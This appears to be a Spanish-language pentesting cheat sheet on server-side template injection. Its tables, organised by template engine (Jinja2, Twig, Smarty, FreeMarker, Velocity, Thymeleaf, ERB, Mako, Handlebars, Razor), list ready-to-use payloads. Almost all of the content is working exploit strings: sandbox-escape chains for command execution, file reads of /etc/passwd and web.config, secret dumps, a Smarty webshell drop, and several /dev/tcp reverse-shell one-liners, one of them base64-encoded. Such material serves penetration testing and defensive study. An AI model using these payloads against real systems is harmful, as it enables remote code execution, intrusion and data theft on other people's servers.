---
aliases:
  - SSTI RCE
  - Template Engine RCE
  - SSTI Execution
tags:
  - type/cheatsheet
  - vuln/ssti
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Server-Side Template Injection (SSTI)]]'
---
# SSTI - Ejecución por Engine

***

## Jinja2 (Python / Flask)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `{{7*7}}` | `49` |
| Confirm Flask context | `{{config}}` | Dump del Flask config object. |
| Listar subclases | `{{ ''.__class__.__mro__[1].__subclasses__() }}` | Lista clases Python disponibles. |
| Buscar subprocess.Popen | Index varies — buscar `<class 'subprocess.Popen'>` en lista | Index típico ~400. |
| RCE via Popen index | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>](['id'], stdout=-1).communicate() }}` | Reemplazar `<index>` con el correcto. |
| RCE via os.popen (compacto) | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Sin enumerar subclases. |
| RCE via config | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` | Con sandbox parcial. |
| RCE via request | `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Si `self` filtrado. |
| RCE via lipsum (Flask) | `{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Helper Flask siempre disponible. |
| RCE via cycler (Jinja2) | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` | Helper Jinja2. |
| Reverse shell | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>](['bash','-c','bash -i >& /dev/tcp/IP/4444 0>&1']) }}` | Direct fork. |
| File read | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('/etc/passwd').read() }}` | Index de `<class '_io.TextIOWrapper'>`. |
^ssti-engine-jinja2

___

## Twig (PHP / Symfony)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `{{7*'7'}}` | `7777777` (string multiplication confirma Twig vs Jinja2). |
| Twig 1.x RCE | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` | Vector clásico. |
| Twig 2.x sandbox bypass | `{{['id']\|filter('system')}}` | Filter abuse. |
| Twig 3.x — buscar new gadget | Generalmente sandbox más estricto. | Combinar con CVE específicos. |
| Symfony 4.x RCE | `{{['id']\|map('system')\|join(',')}}` | Map filter abuse. |
| Symfony — getEnv | `{{app.request.server.get('HTTP_HOST')}}` | Disclosure server config. |
| Symfony — get session | `{{app.session}}` | Dump session data. |
| Symfony — DB | `{{app.entity.manager.connection.executeQuery('SHOW TABLES')}}` | Si entity manager expuesto. |
| RCE via filter chain | `{{["id",""]\|sort("system")}}` | Sort callback. |
| RCE via filter raw | `{{['id']\|filter('passthru')}}` | passthru output directo. |
| Get template source | `{{_self.env.getTemplateSource("file.twig")}}` | File read. |
^ssti-engine-twig

___

## Smarty (PHP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `{7*7}` | `49` (delimitador `{` simple). |
| Smarty v2 RCE directo | `{system('id')}` | Función PHP directa. |
| Smarty v2 PHP | `{php}echo \`id\`;{/php}` | Bloque PHP raw. |
| Smarty v3 RCE Internal_Write_File | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?=`$_GET[c]`?>",self::clearConfig())}` | Smarty 3 webshell drop. |
| Smarty v3 self_template | `{self::getStreamVariable("file:///etc/passwd")}` | File read. |
| Smarty `{if}` con func | `{if system('id')}{/if}` | Branch eval. |
| Smarty math function | `{math equation="7*7"}` | Confirmar inyección. |
| Disable security | `{php}eval($_GET[c]);{/php}` | Si Smarty con `php_handling=PHP_PASSTHRU`. |
| Bypass `{php}` block disable | Usar `{Smarty_Internal_*}` static | Smarty 3 fallback. |
| Webshell via include | `{include file="data:text/plain,{php}system('id'){/php}"}` | Stream wrappers PHP. |
^ssti-engine-smarty

___

## FreeMarker (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `${7*7}` | `49` |
| RCE clásico Execute | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Default class disponible. |
| RCE con ObjectConstructor | `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"]).start()}` | Si Execute bloqueado. |
| RCE con Runtime via Execute | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSAmJiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE=}|{base64,-d}|bash")}` | Reverse shell base64-encoded. |
| File read | `<#include "/etc/passwd">` | Include directiva. |
| File read alt | `<#assign value="freemarker.template.utility.Execute"?new()>${value("cat /etc/passwd")}` | Via Execute. |
| RCE Spring | `<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}` | Spring + FreeMarker stack. |
| Jython gadget | `${"java.lang.Runtime".getRuntime().exec("id")}` | Si reflection allowed. |
| ?api gadget | `${object?api.class.protectionDomain.codeSource.location.toURI().resolve('/').path}` | Disclosure paths Spring. |
| Hubspot CVE-2023-32692 | Específico — ver advisory | Apache FreeMarker 2.3.x. |
^ssti-engine-freemarker

___

## Velocity (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `#set($x=7*7)$x` | `49` |
| RCE clásico | `#set($e="exp") $e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Reflection chain. |
| RCE compacto | `#set($s="")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))$runtime.exec("id")` | Más legible. |
| File read | `#set($input=$s.getClass().forName("java.io.File").getConstructor($stringClass).newInstance("/etc/passwd"))` | Reflection clásica. |
| Velocity 2.x security | Default mode = `secure` | Bypass requiere reflection avanzada. |
| Confluence Velocity | `$render.eval(...)` específico | Atlassian gadgets. |
| ContextTool gadget | `$cookie.set("XSS","<script>")` | Si tools.xml tiene CookieTool. |
^ssti-engine-velocity

___

## Thymeleaf (Spring)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `${7*7}` o `[[${7*7}]]` | `49` solo en server-side context (`th:text`, `th:utext`). |
| RCE via T() | `${T(java.lang.Runtime).getRuntime().exec('id')}` | SpringEL — funcional en `th:` attributes. |
| RCE con Process read | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` | Output como string. |
| Inline expression | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` | Inline syntax. |
| Selection expression | `*{T(java.lang.Runtime)...}` | Selection syntax. |
| Spring Boot Actuator gadget | `${@org.springframework.boot.SpringApplication@exit(...)}` | Si Actuator expuesto. |
| File read | `${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}` | Compose con StreamUtils. |
| Escape expression preprocessor | `__${T(java.lang.Runtime)...}__::.x` | Bypass de algunos filtros. |
^ssti-engine-thymeleaf

___

## ERB (Ruby / Rails)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `<%= 7*7 %>` | `49` |
| RCE backtick | `<%= \`id\` %>` | Backtick = exec en Ruby. |
| RCE system | `<%= system("id") %>` | Output a stdout (no captura — usar IO.popen). |
| RCE IO.popen | `<%= IO.popen("id").read %>` | Captura stdout. |
| RCE Open3 | `<%= Open3.capture3("id").first %>` | Stderr + stdout + status. |
| File read | `<%= File.read("/etc/passwd") %>` | Direct File.read. |
| Rails console gadget | `<%= ActiveRecord::Base.connection.execute("SELECT version()").first %>` | DB. |
| Rails secret | `<%= Rails.application.secrets %>` | Disclosure secrets. |
| Reverse shell | `<%= \`bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'\` %>` | Direct exec. |
| ERB.new gadget | `ERB.new("<%= cmd %>").result` | Si app pasa input a ERB.new explícito. |
| Liquid (Shopify) | `{{ "id" \| system_call }}` (custom filters) | Solo si filter custom inseguro. |
^ssti-engine-erb

___

## Mako (Python)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `${7*7}` | `49` |
| RCE inline | `<%= os.popen('id').read() %>` | Bloque Python directo. |
| RCE expression | `${os.popen('id').read()}` | Inline expression. |
| Import + RCE | `<% import os %>${os.system('id')}` | Si import permitido. |
| File read | `${open('/etc/passwd').read()}` | Direct. |
| RCE compacto | `${self.module.cache.util.os.system('id')}` | Si self disponible. |
| RCE via subprocess | `${__import__('subprocess').check_output('id', shell=True)}` | Built-in. |
| Reverse shell | `${__import__('os').system('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"')}` | One-liner. |
| Mako sandbox bypass | `${''.__class__.__mro__[2].__subclasses__()[40](...)}` | Subclass enumeration igual a Jinja2. |
| Pyramid/Pylons stack | Default Mako | Frameworks Python clásicos. |
^ssti-engine-mako

___

## Handlebars (Node.js)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `{{7*7}}` NO ejecuta | Handlebars es logic-less por default. |
| RCE via require gadget | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}` | Vector tradicional Handlebars (logic-less bypass). |
| RCE via prototype pollution | Si app vulnerable a proto pollution + Handlebars | Combo. |
| File read | Difícil sin require — gadget largo | Mismo vector RCE → leer archivo. |
| Express + Handlebars | Backend común — Hapi.js, Express con hbs | Setup vulnerable típico. |
| Mustache logic-less | Mismo concepto, generalmente NO RCE directo | Sandbox real más estricto. |
^ssti-engine-handlebars

___

## Razor (.NET)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Detección | `@(7*7)` | `49` (Razor inline). |
| Detección bloque | `@{int x = 7*7;}` + reflejado | Bloque code. |
| RCE via System.Diagnostics | `@{System.Diagnostics.Process.Start("calc.exe");}` | Direct .NET. |
| RCE con cmd.exe | `@{System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c id") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd();}` | Captura stdout. |
| Read file | `@System.IO.File.ReadAllText("C:\\inetpub\\wwwroot\\web.config")` | Disclosure config. |
| Reverse shell PowerShell | `@{System.Diagnostics.Process.Start("powershell.exe","-enc <base64>");}` | Encoded payload. |
| Razor Pages context | `@Model.Property` puede leak data | Si app pasa user-controlled a Razor literal. |
| Blazor server-side | Mismo riesgo que Razor Pages | Modern stack. |
| RazorEngine standalone | `@Model.Hack` | Lib usada para template emails. |
^ssti-engine-razor

***
